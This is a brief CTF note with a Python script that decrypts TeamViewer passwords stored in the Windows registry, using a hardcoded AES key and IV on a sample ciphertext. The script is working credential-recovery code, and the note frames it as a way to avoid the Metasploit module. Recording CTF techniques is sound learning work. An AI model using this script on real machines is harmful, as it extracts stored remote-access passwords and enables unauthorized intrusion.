# Get Passwords from Teamviewer windows (No Metasploit)

* used this while solving a CTF&#x20;
  * there is a module in metasploit but did not want to use it&#x20;
  * Link to Repo
    * [https://github.com/nathaniel-security/Get-Passwords-from-Teamviewer-windows-No-Metasploit-](https://github.com/nathaniel-security/Get-Passwords-from-Teamviewer-windows-No-Metasploit-)

```
source env/bin/activate
```

```python
import sys, hexdump, binascii

from Crypto.Cipher import AES

  

class AESCipher:

    def __init__(self, key):

        self.key = key

  

    def decrypt(self, iv, data):

        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)

        return self.cipher.decrypt(data)

  

key = binascii.unhexlify("0602000000a400005253413100040000")

iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")

hex_str_cipher = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"         # output from the registry

  

ciphertext = binascii.unhexlify(hex_str_cipher)

  

raw_un = AESCipher(key).decrypt(iv, ciphertext)

  

print(hexdump.hexdump(raw_un))

  

password = raw_un.decode('utf-16')

print(password)
```

## Reference

* https://whynotsecurity.com/blog/teamviewer/
